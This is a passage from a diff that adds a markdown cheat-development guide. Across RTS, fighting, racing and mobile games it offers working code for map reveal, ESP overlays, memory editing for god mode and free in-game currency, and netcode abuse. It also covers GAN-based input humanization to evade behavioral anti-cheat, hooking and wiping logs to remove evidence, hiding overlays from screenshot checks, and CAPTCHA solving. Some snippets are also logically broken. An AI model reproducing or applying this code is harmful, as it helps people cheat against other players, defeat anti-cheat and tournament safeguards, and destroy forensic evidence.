+        self.model = tf.keras.models.load_model(model_path)
+        
+    def solve_captcha(self, image_data):
+        # Preprocess image
+        img = Image.open(io.BytesIO(image_data))
+        img = img.resize((200, 60))
+        img_array = np.array(img) / 255.0
+        img_array = np.expand_dims(img_array, axis=0)
+        
+        # Predict
+        prediction = self.model.predict(img_array)
+        
+        # Decode prediction to text
+        characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+        result = ""
+        for pred in prediction:
+            result += characters[np.argmax(pred)]
+        
+        return result
+    
+    def train_solver(self, training_data):
+        # Create CNN model for captcha recognition
+        model = tf.keras.Sequential([
+            tf.keras.layers.Conv2D(32, (3, 3), activation='relu', input_shape=(60, 200, 3)),
+            tf.keras.layers.MaxPooling2D((2, 2)),
+            tf.keras.layers.Conv2D(64, (3, 3), activation='relu'),
+            tf.keras.layers.MaxPooling2D((2, 2)),
+            tf.keras.layers.Flatten(),
+            tf.keras.layers.Dense(128, activation='relu'),
+            tf.keras.layers.Dropout(0.5),
+            tf.keras.layers.Dense(36, activation='softmax')  # 26 letters + 10 digits
+        ])
+        
+        model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])
+        
+        # Train model
+        model.fit(training_data['images'], training_data['labels'], epochs=50, batch_size=32)
+        model.save('captcha_solver.h5')
+```
+
+---
+
+### RTS (StarCraft, Age of Empires)
+
+#### Fog of War Removal
+
+```cpp
+// Hook visibility system
+class FogOfWarHack {
+public:
+    void RevealMap() {
+        GameWorld* world = GetGameWorld();
+        
+        // Method 1: Set all tiles to visible
+        for (int x = 0; x < world->mapWidth; x++) {
+            for (int y = 0; y < world->mapHeight; y++) {
+                world->visibilityMap[x][y] = VISIBILITY_VISIBLE;
+            }
+        }
+        
+        // Method 2: Hook line-of-sight calculations
+        HookFunction("CalculateLineOfSight", Hook_CalculateLineOfSight);
+    }
+    
+    static bool Hook_CalculateLineOfSight(Vector2 from, Vector2 to) {
+        // Always return true (can see everything)
+        return true;
+    }
+    
+    void RevealEnemyUnits() {
+        TArray<Unit*> allUnits = GetAllUnits();
+        
+        for (Unit* unit : allUnits) {
+            if (unit->GetOwner() != GetLocalPlayer()) {
+                // Force enemy units to be visible
+                unit->SetVisibility(true);
+                unit->SetMinimapVisible(true);
+            }
+        }
+    }
+};
+```
+
+#### Production Queue Reading
+
+```cpp
+struct ProductionQueueItem {
+    uint32_t unitType;
+    float progress;  // 0.0 to 1.0
+    float timeRemaining;
+};
+
+class ProductionESP {
+public:
+    void ScanEnemyProduction() {
+        TArray<Building*> buildings = GetAllBuildings();
+        
+        for (Building* building : buildings) {
+            if (building->GetOwner() == GetLocalPlayer()) continue;
+            
+            // Read production queue
+            std::vector<ProductionQueueItem> queue = building->GetProductionQueue();
+            
+            if (!queue.empty()) {
+                Vector2 screenPos;
+                if (WorldToScreen(building->GetPosition(), screenPos)) {
+                    ImGui::SetCursorPos(ImVec2(screenPos.x, screenPos.y));
+                    
+                    for (const auto& item : queue) {
+                        char text[64];
+                        sprintf(text, "%s (%.0f%%)", 
+                               GetUnitName(item.unitType), 
+                               item.progress * 100);
+                        
+                        ImGui::Text("%s", text);
+                    }
+                }
+            }
+        }
+    }
+};
+```
+
+#### APM Automation (Macro Bot)
+
+```python
+class MacroBot:
+    def __init__(self):
+        self.actions_per_minute = 0
+        self.action_queue = []
+        
+    def optimize_build_order(self, strategy):
+        # Perfect build order execution
+        build_orders = {
+            'rush': [
+                (0, 'train_worker'),
+                (12, 'build_barracks'),
+                (14, 'train_worker'),
+                (16, 'train_marine'),
+                (18, 'train_marine'),
+                # ...
+            ],
+            'economy': [
+                (0, 'train_worker'),
+                (15, 'build_expansion'),
+                # ...
+            ]
+        }
+        
+        return build_orders.get(strategy, [])
+    
+    def execute_macro_cycle(self):
+        # Automated macro tasks
+        self.train_workers()
+        self.spend_resources()
+        self.expand_bases()
+        self.tech_upgrades()
+        self.inject_larvae()  # For Zerg
+        
+    def train_workers(self):
+        bases = get_all_bases()
+        
+        for base in bases:
+            if base.is_idle() and can_afford('worker'):
+                base.train_unit('worker')
+                self.actions_per_minute += 1
+    
+    def spend_resources(self):
+        resources = get_current_resources()
+        
+        # Prevent resource banking
+        if resources['minerals'] > 400:
+            # Build production buildings
+            if can_afford('barracks'):
+                build_structure('barracks', find_build_location())
+                self.actions_per_minute += 2
+        
+        if resources['gas'] > 200:
+            # Tech up
+            if can_afford('factory'):
+                build_structure('factory', find_build_location())
+                self.actions_per_minute += 2
+```
+
+---
+
+### Fighting Games (Street Fighter, Tekken, Guilty Gear)
+
+#### Frame Data Reading
+
+```cpp
+struct FrameData {
+    int startup;       // Frames until attack becomes active
+    int active;        // Frames attack is active
+    int recovery;      // Frames until character can act again
+    int onBlock;       // Frame advantage when blocked
+    int onHit;         // Frame advantage when it hits
+    bool invincible;   // Has invincibility frames
+};
+
+class FrameDataReader {
+public:
+    FrameData ReadMoveData(Player* player, int moveId) {
+        // Hook into game's frame data table
+        FrameDataTable* table = GetFrameDataTable();
+        
+        FrameData data;
+        MoveInfo* move = table->GetMove(player->characterId, moveId);
+        
+        data.startup = move->startupFrames;
+        data.active = move->activeFrames;
+        data.recovery = move->recoveryFrames;
+        data.onBlock = move->blockAdvantage;
+        data.onHit = move->hitAdvantage;
+        data.invincible = move->hasInvincibility;
+        
+        return data;
+    }
+    
+    void DisplayFrameAdvantage() {
+        Player* p1 = GetPlayer(0);
+        Player* p2 = GetPlayer(1);
+        
+        int p1Frame = p1->GetCurrentFrame();
+        int p2Frame = p2->GetCurrentFrame();
+        
+        int advantage = p1Frame - p2Frame;
+        
+        ImGui::Begin("Frame Data");
+        ImGui::Text("Frame Advantage: %+d", advantage);
+        
+        if (advantage > 0) {
+            ImGui::TextColored(ImVec4(0, 1, 0, 1), "Player 1 Advantage");
+        } else if (advantage < 0) {
+            ImGui::TextColored(ImVec4(1, 0, 0, 1), "Player 2 Advantage");
+        }
+        
+        ImGui::End();
+    }
+};
+```
+
+#### Input Prediction
+
+```cpp
+class InputPredictor {
+private:
+    std::deque<InputState> m_inputHistory;
+    
+public:
+    void RecordInput(InputState input) {
+        m_inputHistory.push_back(input);
+        if (m_inputHistory.size() > 60) {  // Keep 1 second of history at 60 FPS
+            m_inputHistory.pop_front();
+        }
+    }
+    
+    InputState PredictNextInput() {
+        // Analyze patterns in input history
+        if (m_inputHistory.size() < 10) {
+            return InputState();
+        }
+        
+        // Detect common patterns (e.g., quarter-circle motions)
+        if (DetectQuarterCircle(m_inputHistory)) {
+            // Opponent is likely doing a special move
+            return PredictSpecialMove();
+        }
+        
+        if (DetectDashInput(m_inputHistory)) {
+            return PredictDashDirection();
+        }
+        
+        // Use ML model for complex prediction
+        return MLPredictInput(m_inputHistory);
+    }
+    
+    bool DetectQuarterCircle(const std::deque<InputState>& history) {
+        // Check for down, down-forward, forward sequence
+        if (history.size() < 3) return false;
+        
+        return history[history.size()-3].direction == DIR_DOWN &&
+               history[history.size()-2].direction == DIR_DOWN_FORWARD &&
+               history[history.size()-1].direction == DIR_FORWARD;
+    }
+};
+```
+
+#### Rollback Netcode Abuse
+
+```cpp
+class RollbackExploit {
+public:
+    void InduceRollback() {
+        // Artificially create network conditions that trigger rollback
+        // This can confuse opponent's inputs
+        
+        NetworkManager* netMgr = GetNetworkManager();
+        
+        // Delay packets intentionally
+        netMgr->SetPacketDelay(50);  // 50ms delay
+        
+        // Or drop packets to force resync
+        netMgr->DropNextPackets(3);
+    }
+    
+    void ExploitInputPriority() {
+        // In rollback netcode, local inputs have priority
+        // Abuse this by buffering advantageous inputs
+        
+        InputManager* inputMgr = GetInputManager();
+        
+        // Buffer a reversal input
+        InputState reversal;
+        reversal.buttons = BUTTON_SPECIAL;
+        reversal.direction = DIR_FORWARD;
+        
+        // This will execute on the exact frame of opponent's attack ending
+        inputMgr->BufferInput(reversal, 1);  // 1-frame window
+    }
+};
+```
+
+---
+
+### Racing Games (Forza, Gran Turismo, iRacing)
+
+#### Telemetry Injection
+
+```cpp
+struct TelemetryData {
+    float speed;
+    float rpm;
+    float gear;
+    Vector3 position;
+    Vector3 velocity;
+    float steering;
+    float throttle;
+    float brake;
+};
+
+class TelemetryHack {
+public:
+    void ModifyTelemetry(TelemetryData& data) {
+        // Remove speed limiter
+        if (data.speed > MAX_SPEED) {
+            data.speed = MAX_SPEED;  // Don't modify, would be detected
+        }
+        
+        // Optimal gear shifting
+        if (ShouldShiftUp(data.rpm, data.gear)) {
+            SimulateGearShift(data.gear + 1);
+        }
+        
+        // Perfect racing line assistance
+        Vector3 optimalPosition = CalculateRacingLine(data.position, GetCurrentTrack());
+        AdjustSteering(optimalPosition, data.position);
+    }
+    
+    Vector3 CalculateRacingLine(Vector3 currentPos, Track* track) {
+        // Use racing line algorithm
+        TrackSegment* segment = track->GetSegment(currentPos);
+        
+        // Apex calculation
+        if (segment->isTurn) {
+            // Late apex for faster exit speed
+            float apexRatio = 0.6f;  // 60% through turn
+            return segment->GetApexPoint(apexRatio);
+        }
+        
+        // Straight: maximize acceleration
+        return segment->centerLine;
+    }
+};
+```
+
+#### Ghost Car Manipulation
+
+```cpp
+class GhostCarHack {
+public:
+    void RecordOptimalLap() {
+        // Record inputs, not positions
+        // This allows for perfect reproduction
+        
+        std::vector<InputFrame> recording;
+        
+        while (!LapComplete()) {
+            InputFrame frame;
+            frame.steering = GetSteeringInput();
+            frame.throttle = GetThrottleInput();
+            frame.brake = GetBrakeInput();
+            frame.gear = GetCurrentGear();
+            frame.timestamp = GetGameTime();
+            
+            recording.push_back(frame);
+        }
+        
+        SaveRecording(recording, "optimal_lap.ghost");
+    }
+    
+    void PlaybackGhostCar() {
+        std::vector<InputFrame> recording = LoadRecording("optimal_lap.ghost");
+        
+        size_t frameIndex = 0;
+        while (frameIndex < recording.size()) {
+            InputFrame& frame = recording[frameIndex];
+            
+            // Inject inputs
+            SetSteeringInput(frame.steering);
+            SetThrottleInput(frame.throttle);
+            SetBrakeInput(frame.brake);
+            
+            frameIndex++;
+            Sleep(16);  // 60 FPS
+        }
+    }
+};
+```
+
+---
+
+## Modern Network Protocol Exploitation
+
+### QUIC/HTTP3 Traffic Interception
+
+QUIC is UDP-based and encrypted by default, requiring TLS inspection at application layer.
+
+```python
+from scapy.all import *
+import dpkt
+
+class QUICInterceptor:
+    def __init__(self):
+        self.connections = {}
+        
+    def intercept_quic(self, packet):
+        if packet.haslayer(UDP):
+            udp = packet[UDP]
+            
+            # QUIC typically uses port 443
+            if udp.dport == 443 or udp.sport == 443:
+                try:
+                    # Parse QUIC header
+                    data = bytes(udp.payload)
+                    
+                    # Check for QUIC packet (first byte flags)
+                    if len(data) > 0 and (data[0] & 0xC0) != 0:
+                        self.parse_quic_packet(data)
+                except:
+                    pass
+    
+    def parse_quic_packet(self, data):
+        # Extract connection ID
+        header_form = (data[0] & 0x80) >> 7
+        
+        if header_form == 1:  # Long header
+            version = int.from_bytes(data[1:5], 'big')
+            dcid_len = data[5]
+            dcid = data[6:6+dcid_len]
+            
+            print(f"QUIC Connection: Version {version}, DCID {dcid.hex()}")
+            
+            # Track connection for later manipulation
+            self.connections[dcid.hex()] = {
+                'version': version,
+                'packets': []
+            }
+```
+
+### gRPC API Reverse Engineering
+
+```python
+import grpc
+from grpc_reflection.v1alpha import reflection_pb2, reflection_pb2_grpc
+
+class GRPCReverser:
+    def __init__(self, target_host):
+        self.host = target_host
+        self.channel = grpc.insecure_channel(target_host)
+        
+    def discover_services(self):
+        # Use server reflection to discover services
+        stub = reflection_pb2_grpc.ServerReflectionStub(self.channel)
+        
+        request = reflection_pb2.ServerReflectionRequest(
+            list_services=""
+        )
+        
+        responses = stub.ServerReflectionInfo(iter([request]))
+        
+        services = []
+        for response in responses:
+            if response.HasField('list_services_response'):
+                for service in response.list_services_response.service:
+                    services.append(service.name)
+                    print(f"Found service: {service.name}")
+        
+        return services
+    
+    def fuzz_service(self, service_name, method_name):
+        # Get method descriptor
+        stub = reflection_pb2_grpc.ServerReflectionStub(self.channel)
+        
+        # Request file descriptor
+        request = reflection_pb2.ServerReflectionRequest(
+            file_containing_symbol=f"{service_name}.{method_name}"
+        )
+        
+        responses = stub.ServerReflectionInfo(iter([request]))
+        
+        for response in responses:
+            if response.HasField('file_descriptor_response'):
+                # Parse proto and fuzz
+                self.fuzz_method(service_name, method_name, response)
+```
+
+### Protobuf Schema Extraction
+
+```python
+import struct
+
+class ProtobufExtractor:
+    def __init__(self, binary_data):
+        self.data = binary_data
+        self.fields = {}
+        
+    def extract_schema(self):
+        offset = 0
+        field_num = 1
+        
+        while offset < len(self.data):
+            # Parse varint key
+            key, bytes_read = self._read_varint(offset)
+            offset += bytes_read
+            
+            field_number = key >> 3
+            wire_type = key & 0x7
+            
+            # Determine field type
+            if wire_type == 0:  # Varint
+                value, bytes_read = self._read_varint(offset)
+                offset += bytes_read
+                self.fields[field_number] = ('int', value)
+                
+            elif wire_type == 1:  # 64-bit
+                value = struct.unpack('<d', self.data[offset:offset+8])[0]
+                offset += 8
+                self.fields[field_number] = ('double', value)
+                
+            elif wire_type == 2:  # Length-delimited (string/bytes/message)
+                length, bytes_read = self._read_varint(offset)
+                offset += bytes_read
+                value = self.data[offset:offset+length]
+                offset += length
+                
+                # Try to decode as string
+                try:
+                    value_str = value.decode('utf-8')
+                    self.fields[field_number] = ('string', value_str)
+                except:
+                    # Might be nested message
+                    self.fields[field_number] = ('bytes', value.hex())
+                    
+            elif wire_type == 5:  # 32-bit
+                value = struct.unpack('<f', self.data[offset:offset+4])[0]
+                offset += 4
+                self.fields[field_number] = ('float', value)
+        
+        return self.fields
+    
+    def _read_varint(self, offset):
+        result = 0
+        shift = 0
+        bytes_read = 0
+        
+        while True:
+            byte = self.data[offset + bytes_read]
+            result |= (byte & 0x7F) << shift
+            bytes_read += 1
+            
+            if (byte & 0x80) == 0:
+                break
+                
+            shift += 7
+        
+        return result, bytes_read
+```
+
+---
+
+## Cross-Platform & Emulation Exploitation
+
+### Proton/Wine Game Memory Access
+
+```bash
+# Wine memory mapping
+wine_pid=$(pgrep -f "GameExecutable.exe")
+wine_addr_base=$(grep heap /proc/$wine_pid/maps | head -1 | cut -d'-' -f1)
+
+# Access game memory from Linux
+gdb -p $wine_pid <<EOF
+set \$base = 0x$wine_addr_base
+# Read player health at offset
+x/1xw \$base+0x12AB340
+# Write god mode
+set {int}(\$base+0x12AB340) = 999
+continue
+EOF
+```
+
+### WSL2 Windows Game Exploitation
+
+```python
+import ctypes
+from ctypes import wintypes
+
+# Access Windows process from WSL2
+class WSL2GameHack:
+    def __init__(self, process_name):
+        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+        self.process_name = process_name
+        self.process_handle = None
+        
+    def open_process(self):
+        # Get process ID via /proc/sys/fs/binfmt_misc/WSLInterop
+        snapshot = self.kernel32.CreateToolhelp32Snapshot(0x00000002, 0)
+        
+        pe = PROCESSENTRY32()
+        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
+        
+        if self.kernel32.Process32First(snapshot, ctypes.byref(pe)):
+            while True:
+                if pe.szExeFile.decode() == self.process_name:
+                    self.process_handle = self.kernel32.OpenProcess(
+                        0x1F0FFF,  # PROCESS_ALL_ACCESS
+                        False,
+                        pe.th32ProcessID
+                    )
+                    break
+                    
+                if not self.kernel32.Process32Next(snapshot, ctypes.byref(pe)):
+                    break
+        
+        self.kernel32.CloseHandle(snapshot)
+    
+    def read_memory(self, address, size):
+        buffer = ctypes.create_string_buffer(size)
+        bytes_read = ctypes.c_size_t()
+        
+        self.kernel32.ReadProcessMemory(
+            self.process_handle,
+            ctypes.c_void_p(address),
+            buffer,
+            size,
+            ctypes.byref(bytes_read)
+        )
+        
+        return buffer.raw
+```
+
+### Android Emulator Hacking (BlueStacks, LDPlayer)
+
+```python
+import frida
+
+class EmulatorHack:
+    def __init__(self, emulator_type='bluestacks'):
+        self.emulator_type = emulator_type
+        self.device = None
+        
+    def connect_emulator(self):
+        # Connect to emulator's Frida server
+        if self.emulator_type == 'bluestacks':
+            self.device = frida.get_device_manager().add_remote_device('127.0.0.1:5555')
+        elif self.emulator_type == 'ldplayer':
+            self.device = frida.get_device_manager().add_remote_device('127.0.0.1:5037')
+        
+        return self.device
+    
+    def hook_game(self, package_name):
+        session = self.device.attach(package_name)
+        
+        script = session.create_script("""
+            // Hook Unity functions
+            var unityModule = Process.getModuleByName("libunity.so");
+            
+            // Hook player damage
+            var takeDamage = unityModule.getExportByName("_ZN6Player10TakeDamageEf");
+            Interceptor.attach(takeDamage, {
+                onEnter: function(args) {
+                    console.log("Taking damage: " + args[1]);
+                    args[1] = ptr(0);  // Nullify damage
+                }
+            });
+            
+            // Hook currency spending
+            var spendGems = unityModule.getExportByName("_ZN8Inventory9SpendGemsEi");
+            Interceptor.replace(spendGems, new NativeCallback(function(amount) {
+                console.log("Preventing gem spend: " + amount);
+                return 1;  // Always succeed without spending
+            }, 'int', ['int']));
+        """)
+        
+        script.load()
+        
+    def modify_emulator_props(self):
+        # Spoof device properties to avoid detection
+        adb_commands = [
+            'adb shell setprop ro.product.brand "samsung"',
+            'adb shell setprop ro.product.model "SM-G998B"',
+            'adb shell setprop ro.build.fingerprint "samsung/SM-G998B/beyond2q:12/SP1A.210812.016/G998BXXU5DVHG:user/release-keys"',
+        ]
+        
+        for cmd in adb_commands:
+            os.system(cmd)
+```
+
+### Apple Silicon (Rosetta 2) Game Reversing
+
+```cpp
+// Detect Rosetta translation
+#include <sys/sysctl.h>
+
+bool IsRunningUnderRosetta() {
+    int ret = 0;
+    size_t size = sizeof(ret);
+    
+    if (sysctlbyname("sysctl.proc_translated", &ret, &size, NULL, 0) == -1) {
+        return false;
+    }
+    
+    return ret == 1;
+}
+
+// Hook x86_64 instructions in Rosetta
+class RosettaHook {
+public:
+    void HookTranslatedCode() {
+        // Rosetta translates x86_64 to ARM64
+        // Find translation cache
+        void* rosetta_cache = FindRosettaCache();
+        
+        // Patch translated ARM64 code
+        uint32_t* code = (uint32_t*)rosetta_cache;
+        
+        // Replace instruction (e.g., damage calculation)
+        // MOV X0, #999 (health value)
+        *code = 0xD2807CE0;  // MOV X0, #999
+        
+        // Clear instruction cache
+        __builtin___clear_cache((char*)code, (char*)(code + 1));
+    }
+    
+    void* FindRosettaCache() {
+        // Scan for Rosetta runtime
+        vm_address_t address = 0;
+        vm_size_t size = 0;
+        
+        while (true) {
+            mach_vm_address_t addr = address;
+            mach_vm_size_t sz = 0;
+            
+            kern_return_t kr = mach_vm_region(
+                mach_task_self(),
+                &addr,
+                &sz,
+                VM_REGION_BASIC_INFO_64,
+                NULL,
+                NULL,
+                NULL
+            );
+            
+            if (kr != KERN_SUCCESS) break;
+            
+            // Look for Rosetta signatures
+            if (strstr((char*)addr, "rosetta") != NULL) {
+                return (void*)addr;
+            }
+            
+            address = addr + sz;
+        }
+        
+        return NULL;
+    }
+};
+```
+
+---
+
+## Behavioral ML Detection Evasion
+
+### Input Humanization with GANs
+
+```python
+import torch
+import torch.nn as nn
+
+class InputHumanizer(nn.Module):
+    def __init__(self):
+        super().__init__()
+        
+        # Generator network
+        self.generator = nn.Sequential(
+            nn.Linear(100, 256),
+            nn.LeakyReLU(0.2),
+            nn.Linear(256, 512),
+            nn.LeakyReLU(0.2),
+            nn.Linear(512, 2)  # Output: (mouse_x, mouse_y) delta
+        )
+        
+    def forward(self, z):
+        return self.generator(z)
+    
+    def generate_human_input(self, target_delta):
+        # Add noise to make input look human
+        z = torch.randn(1, 100)
+        
+        # Generate realistic input path
+        generated = self.forward(z)
+        
+        # Scale to target
+        scaled = generated * torch.tensor(target_delta)
+        
+        return scaled.detach().numpy()[0]
+
+class MouseHumanizer:
+    def __init__(self):
+        self.model = InputHumanizer()
+        self.load_pretrained_model()
+        
+    def humanize_mouse_movement(self, current_pos, target_pos):
+        delta = (target_pos[0] - current_pos[0], target_pos[1] - current_pos[1])
+        distance = np.sqrt(delta[0]**2 + delta[1]**2)
+        
+        # Generate path with human-like characteristics
+        num_steps = max(5, int(distance / 10))
+        path = []
+        
+        for i in range(num_steps):
+            t = i / num_steps
+            
+            # Bezier curve with noise
+            noise = self.model.generate_human_input([10, 10])
+            
+            point = (
+                current_pos[0] + delta[0] * t + noise[0],
+                current_pos[1] + delta[1] * t + noise[1]
+            )
+            
+            path.append(point)
+            
+            # Add reaction time variation
+            time.sleep(0.001 + random.gauss(0.003, 0.001))
+        
+        return path
+```
+
+### Timing Attack Evasion
+
+```cpp
+class TimingEvasion {
+private:
+    std::mt19937 rng;
+    std::normal_distribution<double> reaction_time;
+    std::normal_distribution<double> action_interval;
+    
+public:
+    TimingEvasion() {
+        rng.seed(std::random_device{}());
+        
+        // Human reaction time: 200-350ms (mean 250ms, stddev 40ms)
+        reaction_time = std::normal_distribution<double>(250, 40);
+        
+        // Action intervals: 100-500ms
+        action_interval = std::normal_distribution<double>(200, 80);
+    }
+    
+    void HumanizedAction(std::function<void()> action) {
+        // Add reaction delay
+        double delay_ms = std::max(150.0, reaction_time(rng));
+        std::this_thread::sleep_for(std::chrono::milliseconds((int)delay_ms));
+        
+        // Execute action
+        action();
+        
+        // Add post-action delay
+        double interval_ms = std::max(80.0, action_interval(rng));
+        std::this_thread::sleep_for(std::chrono::milliseconds((int)interval_ms));
+    }
+    
+    void SimulateThinkTime() {
+        // Humans pause to think/assess
+        // 5% chance of longer pause
+        if ((rng() % 100) < 5) {
+            int think_ms = 500 + (rng() % 1500);
+            std::this_thread::sleep_for(std::chrono::milliseconds(think_ms));
+        }
+    }
+    
+    void AddMicroCorrections(float& mouse_x, float& mouse_y) {
+        // Humans make tiny corrections
+        std::normal_distribution<float> micro(0.0f, 0.5f);
+        
+        mouse_x += micro(rng);
+        mouse_y += micro(rng);
+    }
+};
+```
+
+---
+
+## Anti-Forensics & Evidence Removal
+
+### Log Tampering
+
+```cpp
+// Hook Windows Event Log
+typedef BOOL (WINAPI* ReportEventW_t)(
+    HANDLE hEventLog,
+    WORD wType,
+    WORD wCategory,
+    DWORD dwEventID,
+    PSID lpUserSid,
+    WORD wNumStrings,
+    DWORD dwDataSize,
+    LPCWSTR* lpStrings,
+    LPVOID lpRawData
+);
+
+ReportEventW_t Original_ReportEventW = nullptr;
+
+BOOL WINAPI Hook_ReportEventW(
+    HANDLE hEventLog,
+    WORD wType,
+    WORD wCategory,
+    DWORD dwEventID,
+    PSID lpUserSid,
+    WORD wNumStrings,
+    DWORD dwDataSize,
+    LPCWSTR* lpStrings,
+    LPVOID lpRawData
+) {
+    // Filter out cheat-related events
+    if (dwEventID == CHEAT_DETECTION_EVENT_ID) {
+        return TRUE;  // Pretend success but don't log
+    }
+    
+    return Original_ReportEventW(hEventLog, wType, wCategory, dwEventID, 
+                                  lpUserSid, wNumStrings, dwDataSize, lpStrings, lpRawData);
+}
+
+// Clear game logs
+void ClearGameLogs() {
+    std::vector<std::string> log_paths = {
+        "%APPDATA%\\Game\\logs\\",
+        "%LOCALAPPDATA%\\Game\\Saved\\Logs\\",
+        "%TEMP%\\GameLogs\\"
+    };
+    
+    for (const auto& path : log_paths) {
+        char expanded[MAX_PATH];
+        ExpandEnvironmentStrings(path.c_str(), expanded, MAX_PATH);
+        
+        // Securely delete files
+        WIN32_FIND_DATA findData;
+        HANDLE hFind = FindFirstFile((std::string(expanded) + "*.log").c_str(), &findData);
+        
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                std::string fullPath = std::string(expanded) + findData.cFileName;
+                SecureDeleteFile(fullPath);
+            } while (FindNextFile(hFind, &findData));
+            
+            FindClose(hFind);
+        }
+    }
+}
+
+void SecureDeleteFile(const std::string& path) {
+    // Overwrite with random data before deletion
+    HANDLE hFile = CreateFile(path.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    
+    if (hFile != INVALID_HANDLE_VALUE) {
+        DWORD fileSize = GetFileSize(hFile, NULL);
+        
+        // Overwrite 3 times with random data
+        for (int pass = 0; pass < 3; pass++) {
+            std::vector<BYTE> randomData(fileSize);
+            RAND_bytes(randomData.data(), fileSize);
+            
+            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+            DWORD written;
+            WriteFile(hFile, randomData.data(), fileSize, &written, NULL);
+        }
+        
+        CloseHandle(hFile);
+    }
+    
+    DeleteFile(path.c_str());
+}
+```
+
+### Screenshot Detection Blocking
+
+```cpp
+// Hook screenshot APIs
+typedef BOOL (WINAPI* BitBlt_t)(HDC, int, int, int, int, HDC, int, int, DWORD);
+BitBlt_t Original_BitBlt = nullptr;
+
+BOOL WINAPI Hook_BitBlt(HDC hdcDest, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop) {
+    // Detect screenshot capture
+    if (IsScreenshotCapture(hdcSrc, hdcDest)) {
+        // Clean up overlays
+        HideESPOverlay();
+        
+        // Call original
+        BOOL result = Original_BitBlt(hdcDest, x, y, cx, cy, hdcSrc, x1, y1, rop);
+        
+        // Restore overlays
+        ShowESPOverlay();
+        
+        return result;
+    }
+    
+    return Original_BitBlt(hdcDest, x, y, cx, cy, hdcSrc, x1, y1, rop);
+}
+```
+
+---
+
+## Competitive/Esports Specific Techniques
+
+### Tournament Client Analysis
+
+```python
+def analyze_tournament_client(client_path):
+    # Check for additional protections
+    pe = pefile.PE(client_path)
+    
+    protections = {
+        'signed': False,
+        'integrity_checks': [],
+        'additional_drivers': []
+    }
+    
+    # Check digital signature
+    if hasattr(pe, 'DIRECTORY_ENTRY_SECURITY'):
+        protections['signed'] = True
+    
+    # Scan for integrity check routines
+    for section in pe.sections:
+        data = section.get_data()
+        
+        # Look for CRC32/hash check patterns
+        if b'\x81\xC1' in data:  # add ecx, imm32 (CRC pattern)
+            protections['integrity_checks'].append(section.Name.decode().strip('\x00'))
+    
+    return protections
+```
+
+### LAN Environment Restrictions
+
+```cpp
+// Detect LAN tournament restrictions
+class LANDetection {
+public:
+    bool IsInTournamentEnvironment() {
+        // Check for specific network configuration
+        if (IsNetworkRestricted()) return true;
+        
+        // Check for tournament server certificates
+        if (HasTournamentCertificate()) return true;
+        
+        // Check for admin tools presence
+        if (DetectAdminTools()) return true;
+        
+        return false;
+    }
+    
+    bool IsNetworkRestricted() {
+        // Tournament LANs often have specific IP ranges
+        char hostname[256];
+        gethostname(hostname, sizeof(hostname));
+        
+        struct hostent* host = gethostbyname(hostname);
+        if (host) {
+            struct in_addr** addr_list = (struct in_addr**)host->h_addr_list;
+            
+            for (int i = 0; addr_list[i] != NULL; i++) {
+                std::string ip = inet_ntoa(*addr_list[i]);
+                
+                // Common tournament IP ranges
+                if (ip.find("10.0.") == 0 || ip.find("192.168.100.") == 0) {
+                    return true;
+                }
+            }
+        }
+        
+        return false;
+    }
+};
+```
+
+---
+
 ## Tool Pairings
 
 | Task              | Toolchain                                      |
